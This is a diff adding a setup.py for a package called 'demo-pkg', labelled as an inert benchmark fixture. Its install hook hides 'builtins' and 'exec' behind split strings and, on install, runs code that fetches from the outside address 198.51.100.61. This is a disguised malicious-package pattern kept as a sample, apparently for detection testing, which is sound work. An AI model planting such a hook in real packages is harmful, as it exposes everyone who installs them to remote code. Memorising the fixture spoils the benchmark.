@@ -1,0 +1,11 @@
+# INERT BENCHMARK FIXTURE - never import or run. Read as text by benchmark_fixtures.py only.
+from setuptools import setup
+from setuptools.command.install import install
+_b = __import__("".join(["bui", "ltins"]))
+_run = getattr(_b, "".join(["ex", "ec"]))
+_src = "".join(["import urllib.request as u; ", "u.urlopen('http://198.51.100.61/s').read()"])
+class Install(install):
+    def run(self):
+        _run(_src)
+        install.run(self)
+setup(name="demo-pkg", version="0.0.2", cmdclass={"install": Install})
